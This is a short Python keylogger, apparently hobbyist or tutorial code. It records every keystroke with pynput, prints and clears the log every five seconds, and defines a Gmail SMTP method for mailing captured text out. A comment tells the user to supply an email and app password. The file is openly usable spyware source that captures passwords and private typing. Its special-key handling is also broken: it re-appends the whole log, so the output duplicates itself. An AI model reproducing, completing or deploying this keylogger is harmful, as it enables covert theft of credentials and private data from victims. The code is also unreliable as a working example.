import pynput.keyboard , smtplib
import threading


class Keylogger:

    def __init__(self):
        self.log = ""


    def append_to_log(self , string):
        self.log = self.log + string


    def process_key_press(self , key):        
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = self.log + " "
            else:
                current_key = self.log + " " + str(key) + " "
        self.append_to_log(current_key)
    

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def send_mail(self , email , password , message):
        server = smtplib.SMTP("smtp.gmail.com" , 587)
        server.starttls()
        server.login(email , password)
        server.sendmail(email , email , message)
        server.quit()

#USE YOUR EMAIL AND PASSWORD , USE APP PASSWORD IF YOU HAVE 2FA ENABLED . 
my_keylogger = Keylogger()
my_keylogger.start() 
